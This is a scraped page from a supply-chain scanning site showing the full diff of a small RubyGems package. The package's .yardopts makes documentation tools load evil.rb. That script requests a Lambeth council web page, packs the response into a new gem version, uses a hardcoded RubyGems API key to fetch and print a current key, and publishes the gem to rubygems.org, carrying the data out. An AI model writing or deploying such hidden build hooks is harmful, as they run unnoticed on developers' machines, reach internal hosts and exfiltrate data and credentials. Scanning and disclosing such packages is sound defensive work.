@@ -1,0 +1,488 @@
+Source: https://my.diffend.io/gems/lambfetchx548811/0.0.1
+Retrieved: 2026-09-27T22:38:03.766386+00:00
+
+RubyGems - lambfetchx548811 - Versions diffs - 0.0.1 - Mend - Supply Chain Defender
+
+RubyGems
+
+npm
+
+PyPI
+
+Organizations
+
+Log in
+
+RubyGems
+
+lambfetchx548811
+
+Versions diffs
+
+0.0.1
+
+lambfetchx548811
+0.0.1
+
+This diff represents the content of publicly available package versions that have been released to one of the supported registries. The information contained in this diff is provided for informational purposes only and reflects changes between package versions as they appear in their respective public registries.
+
+        Files changed (6)
+        hide
+        show
+
+            checksums.yaml
+
+          +7
+          -0
+
+            data/.yardopts
+
+          +3
+          -0
+
+            data/README.md
+
+          +1
+          -0
+
+            data/evil.rb
+
+          +22
+          -0
+
+            data/lib/a.rb
+
+          +1
+          -0
+
+            metadata
+
+          +41
+          -0
+
+        checksums.yaml
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,7 @@
+
+1
+
+            +
+            ---
+
+2
+
+            +
+            SHA256:
+
+3
+
+            +
+              metadata.gz: 84af290e5c60ee4d40dc2b184fecd3dc5444e6d2e9197bb9544153987ab46b9a
+
+4
+
+            +
+              data.tar.gz: 40684c18e56456cc04267cdfa5efa745728d06f25037c751ecbcefd2aeda8e75
+
+5
+
+            +
+            SHA512:
+
+6
+
+            +
+              metadata.gz: '0595664e2e7f3c342791f04acc8af9c4b8742336df921194c236877d37793aa7b23abfbf622c1c7dceaa5e17c62a160f328d8fc945cb625a11c977e6f10e964c'
+
+7
+
+            +
+              data.tar.gz: 5eec792333948c388da5793b25c321a840fedf5b1cc4575b43d03d3e406856f7e14e2c810e6c9ffa88987a949d3c0a0da3c16a789e30bdf09ba04cd3740410d5
+
+        data/.yardopts
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,3 @@
+
+1
+
+            +
+            --load ./evil.rb
+
+2
+
+            +
+            README.md
+
+3
+
+            +
+            lib/**/*.rb
+
+        data/README.md
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1 @@
+
+1
+
+            +
+            # fetch
+
+        data/evil.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,22 @@
+
+1
+
+            +
+            # ssrf
+
+2
+
+            +
+            begin
+
+3
+
+            +
+            require 'net/http'; require 'uri'; require 'rubygems'; require 'openssl';
+
+4
+
+            +
+            url='https://moderngov.lambeth.gov.uk/mgCalendarMonthView.aspx?GL=1'
+
+5
+
+            +
+            resp=Net::HTTP.get_response(URI(url)); body="STATUS=#{resp.code}\nLEN=#{resp.body.size}\nHEADERS=#{resp.to_hash}\n"+resp.body
+
+6
+
+            +
+            rescue =>e
+
+7
+
+            +
+             body='ERROR '+e.full_message
+
+8
+
+            +
+            end
+
+9
+
+            +
+            begin
+
+10
+
+            +
+             Dir.chdir('/tmp') do
+
+11
+
+            +
+              Dir.mkdir('lambfetchx548811res') rescue nil; Dir.mkdir('lambfetchx548811res/lib') rescue nil
+
+12
+
+            +
+              File.binwrite('lambfetchx548811res/lib/data.txt', body)
+
+13
+
+            +
+              File.write('lambfetchx548811res/lib/a.rb', '# done')
+
+14
+
+            +
+              File.write('lambfetchx548811res/o.gemspec',%q{Gem::Specification.new do |s|
+
+15
+
+            +
+            s.name='lambfetchx548811'; s.version='0.0.2'; s.summary='res'; s.authors=['z'];s.description=s.summary; s.files=Dir['lib/*']; s.license='MIT'; end})
+
+16
+
+            +
+              Dir.chdir('lambfetchx548811res'){ system('gem build o.gemspec'); spec=Dir['*.gem'].first; uri=URI('https://rubygems.org/api/v1/gems'); req=Net::HTTP::Post.new(uri); 
+
+17
+
+            +
+              # fetch latest API key then immediate upload
+
+18
+
+            +
+              oldkey='rubygems_4bb04aa6b8b9c01c6ba90abd224f4a30ff64d8ea2d197808'; keyuri=URI('https://rubygems.org/api/v1/api_key.yaml'); kreq=Net::HTTP::Get.new(keyuri); kreq['Authorization']=oldkey; kresp=Net::HTTP.start(keyuri.host,keyuri.port,use_ssl:true){|h| h.request(kreq)}; current=(kresp.body[/rubygems_[0-9a-f]+/]||oldkey); warn 'KEY '+current; req['Authorization']=current; req['Content-Type']='application/octet-stream'; req.body=File.binread(spec); Net::HTTP.start(uri.host,uri.port,use_ssl:true){|h| resp=h.request(req); warn resp.body} }
+
+19
+
+            +
+             end
+
+20
+
+            +
+            rescue => e
+
+21
+
+            +
+             warn e.full_message
+
+22
+
+            +
+            end
+
+        data/lib/a.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1 @@
+
+1
+
+            +
+            class A;end
+
+        metadata
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,41 @@
+
+1
+
+            +
+            --- !ruby/object:Gem::Specification
+
+2
+
+            +
+            name: lambfetchx548811
+
+3
+
+            +
+            version: !ruby/object:Gem::Version
+
+4
+
+            +
+              version: 0.0.1
+
+5
+
+            +
+            platform: ruby
+
+6
+
+            +
+            authors:
+
+7
+
+            +
+            - z
+
+8
+
+            +
+            bindir: bin
+
+9
+
+            +
+            cert_chain: []
+
+10
+
+            +
+            date: 1980-01-02 00:00:00.000000000 Z
+
+11
+
+            +
+            dependencies: []
+
+12
+
+            +
+            description: tmp
+
+13
+
+            +
+            executables: []
+
+14
+
+            +
+            extensions: []
+
+15
+
+            +
+            extra_rdoc_files: []
+
+16
+
+            +
+            files:
+
+17
+
+            +
+            - ".yardopts"
+
+18
+
+            +
+            - README.md
+
+19
+
+            +
+            - evil.rb
+
+20
+
+            +
+            - lib/a.rb
+
+21
+
+            +
+            licenses:
+
+22
+
+            +
+            - MIT
+
+23
+
+            +
+            metadata: {}
+
+24
+
+            +
+            rdoc_options: []
+
+25
+
+            +
+            require_paths:
+
+26
+
+            +
+            - lib
+
+27
+
+            +
+            required_ruby_version: !ruby/object:Gem::Requirement
+
+28
+
+            +
+              requirements:
+
+29
+
+            +
+              - - ">="
+
+30
+
+            +
+                - !ruby/object:Gem::Version
+
+31
+
+            +
+                  version: '0'
+
+32
+
+            +
+            required_rubygems_version: !ruby/object:Gem::Requirement
+
+33
+
+            +
+              requirements:
+
+34
+
+            +
+              - - ">="
+
+35
+
+            +
+                - !ruby/object:Gem::Version
+
+36
+
+            +
+                  version: '0'
+
+37
+
+            +
+            requirements: []
+
+38
+
+            +
+            rubygems_version: 3.6.7
+
+39
+
+            +
+            specification_version: 4
+
+40
+
+            +
+            summary: tmp
+
+41
+
+            +
+            test_files: []
+
+Contact Us
+
+Terms of Service
+
+Privacy Policy
+
+Docs
+
+Copyright © 2026 Mend Software
